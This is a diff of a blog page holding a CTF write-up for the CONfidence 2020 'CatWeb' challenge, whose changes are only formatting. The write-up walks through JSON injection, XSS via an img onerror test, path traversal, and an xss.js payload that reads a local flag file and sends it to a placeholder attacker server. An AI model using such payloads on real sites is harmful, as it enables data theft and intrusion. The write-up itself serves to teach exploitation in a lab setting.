@@ -61,7 +61,7 @@
 
 
 
-    <meta property="article:published_time" content="2020-04-23 00:46:19 -0600 -0600" />
+    <meta property="article:published_time" content="2020-04-23 00:46:19 -0600 MDT" />
 
 
 
@@ -162,10 +162,10 @@ if (!doNotTrack) {
 
 <p>We have a basic webpage with photos of cute cats filtered by their color. The drop down menu will give us black, red, grey and white cats. At the bottom is a report button, which will take whatever input we get, send it to some server, and respond to us that our report has been&hellip;well. Reported.</p>
 <p>Checking out the response content as I was clicking about the page showed me the requests for the &ldquo;kind&rdquo; (colour) of cats I chose based on the drop down menu. The request was just a small JSON string stipulating what kind I asked for, and I guess the server takes that input and returns whatever.</p>
-<pre><code>curl &quot;http://catweb.zajebistyc.tf/cats?kind=grey&quot;
+<pre tabindex="0"><code>curl &#34;http://catweb.zajebistyc.tf/cats?kind=grey&#34;
 </code></pre><p>That got me thinking, can I ask for cats of a kind not in the drop down menu?
 Editing the request to change the kind from a colour to just absolute garbage&hellip;</p>
-<pre><code>curl &quot;http://catweb.zajebistyc.tf/?kind=djfa&quot;
+<pre tabindex="0"><code>curl &#34;http://catweb.zajebistyc.tf/?kind=djfa&#34;
 </code></pre>
     <img src="https://jamvie.net/images/NotFound.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
 
@@ -173,7 +173,7 @@ Editing the request to change the kind from a colour to just absolute garbage&he
 <p>Aha! Our text got echoed back to us in the response. There isn&rsquo;t any input validation in the JSON request! This must be a way in.</p>
 <p>To test how far I could go with it, I decided to hide an XSS in the JSON, seeing as how the URL we are taken to after any sort of response also has the JSON text in it.</p>
 <p>I typed this in as the URL:</p>
-<pre><code>http://catweb.zajebistyc.tf/?&quot;,&quot;status&quot;:&quot;ok&quot;,&quot;content&quot;:[&quot;\&quot;&lt;img src=deadbeef onerror=alert(document.title)&gt; &lt;/img&gt;],&quot;ignore&quot;:&quot;
+<pre tabindex="0"><code>http://catweb.zajebistyc.tf/?&#34;,&#34;status&#34;:&#34;ok&#34;,&#34;content&#34;:[&#34;\&#34;&lt;img src=deadbeef onerror=alert(document.title)&gt; &lt;/img&gt;],&#34;ignore&#34;:&#34;
 </code></pre><p>If there was a JSON vulnerability here, then going to this website would load up an alert with the title of the webpage (&ldquo;my cats&rdquo;). What would happen is it would attempt to load an image from the source called &ldquo;deadbeef&rdquo;, and when it can&rsquo;t find the source, it would load as an error. If the image loaded as an error, pop up an alert with the name of the webpage.</p>
 
     <img src="https://jamvie.net/images/XSSJsonInCatWeb.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
@@ -181,7 +181,7 @@ Editing the request to change the kind from a colour to just absolute garbage&he
 
 <p>:) Great! There is definitely JSON injection in play here. Let&rsquo;s see what we can do with it!</p>
 <p>Using curl to delve deeper into the webpage, I tried to make it list directories with the command:</p>
-<pre><code>curl &quot;http://catweb.zajebistyc.tf/cats?kind=..&quot;
+<pre tabindex="0"><code>curl &#34;http://catweb.zajebistyc.tf/cats?kind=..&#34;
 </code></pre>
     <img src="https://jamvie.net/images/CatWebTemplates.jpg"  alt="Login"  class="center"  style="border-radius: 8px;"  />
 
@@ -195,10 +195,10 @@ Editing the request to change the kind from a colour to just absolute garbage&he
 <p>We can use this to our advantage: create an XSS attack on the <code>file://</code> path.</p>
 <p>Since an XSS endpoint was found using the JSON vulnerabilities in the URL, and there exists a report function, this is all a pretty classic XSS attack from here.</p>
 <p>Craft our payload script to fetch the flag.txt from <code>file://</code>. Here&rsquo;s mine called (xss.js):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">url</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://yourServer.com/6060?&#39;</span>
-<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;file:///app/templates/flag.txt&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">resp</span>=&gt;<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">flag</span>=&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span><span style="color:#f92672">+</span>(<span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">flag</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;Nothing&#39;</span>)));
-</code></pre></div><p>Report this url with our payload in it:</p>
-<pre><code>file:///app/templates/index.html?&quot;, &quot;status&quot;: &quot;ok&quot;, &quot;content&quot;:[&quot;\u0022&gt;&lt;script src=http://yourServer.com:6060/xss.js&gt;&lt;/script&gt;&quot;],&quot;ignore&quot;:&quot;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">url</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://yourServer.com/6060?&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;file:///app/templates/flag.txt&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">resp</span>=&gt;<span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">flag</span>=&gt;<span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">url</span><span style="color:#f92672">+</span>(<span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">flag</span>) <span style="color:#f92672">||</span> <span style="color:#e6db74">&#39;Nothing&#39;</span>)));
+</span></span></code></pre></div><p>Report this url with our payload in it:</p>
+<pre tabindex="0"><code>file:///app/templates/index.html?&#34;, &#34;status&#34;: &#34;ok&#34;, &#34;content&#34;:[&#34;\u0022&gt;&lt;script src=http://yourServer.com:6060/xss.js&gt;&lt;/script&gt;&#34;],&#34;ignore&#34;:&#34;
 </code></pre><p>Now we wait for our server to retrieve the flag for us once someone checks out our reported URL :)</p>
 <p><code>flag:p4{can_i_haz_a_piece_of_flag_pliz?}</code></p>
 <p>This was a cool challenge to do that really helped me stretch my XSS skills and teach me how to be thorough when scoping out webpages for possible XSS attacks. I quite enjoyed this challenge! Thank you to <a href="https://p4.team/">P4</a> for hosting the CONfidence 2020 teaser :)</p>
@@ -217,7 +217,7 @@ Editing the request to change the kind from a colour to just absolute garbage&he
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>611 Words</p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-04-22 23:46 -0700</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-04-23 00:46 -0600</p>
         </div>
 
         
@@ -280,7 +280,7 @@ Editing the request to change the kind from a colour to just absolute garbage&he
 
 
 
-<script type="text/javascript" src="https://jamvie.net/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="https://jamvie.net/bundle.min.af5a3e743efae0c74305dc03080fb4bd5ae8f1a60160b3599ab59639ad6c182d763fb4238e72a726f48319ad132a4cdc9cd51fac5462e8a25dc0ba096f547038.js" integrity="sha512-r1o&#43;dD764MdDBdwDCA&#43;0vVro8aYBYLNZmrWWOa1sGC12P7QjjnKnJvSDGa0TKkzcnNUfrFRi6KJdwLoJb1RwOA=="></script>
     
 <script type="application/javascript">
 var doNotTrack = false;
